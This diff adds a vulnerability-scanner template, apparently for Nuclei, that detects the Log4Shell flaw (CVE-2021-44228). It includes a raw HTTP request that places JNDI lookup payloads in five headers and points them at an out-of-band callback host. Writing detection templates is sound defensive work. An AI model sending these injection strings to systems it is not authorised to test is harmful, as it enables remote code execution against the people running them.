@@ -1,0 +1,53 @@
+id: CVE-2021-44228
+
+info:
+  name: Apache Log4j2 RCE - JNDI Lookup (Log4Shell)
+  author: autonomous
+  severity: critical
+  description: |
+    Apache Log4j2 versions 2.0-beta9 through 2.14.1 are vulnerable to a remote code execution
+    attack where an attacker who can control log messages or log message parameters can execute
+    arbitrary code loaded from LDAP servers via JNDI lookup substitution. The vulnerability is
+    triggered when user-controlled input is logged by a vulnerable Log4j2 instance, allowing
+    the attacker to force the application to make an outbound JNDI request to an attacker-controlled
+    server.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  metadata:
+    max-request: 1
+    shodan-query: 'product:"Apache"'
+  tags: cve,cve2021,rce,jndi,log4j,log4shell,oob,critical
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/ua}
+        X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/xff}
+        Referer: ${jndi:ldap://{{interactsh-url}}/ref}
+        X-Api-Version: ${jndi:ldap://{{interactsh-url}}/xav}
+        Accept-Language: ${jndi:ldap://{{interactsh-url}}/al}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - ".*"
+
+    stop-at-first-match: true
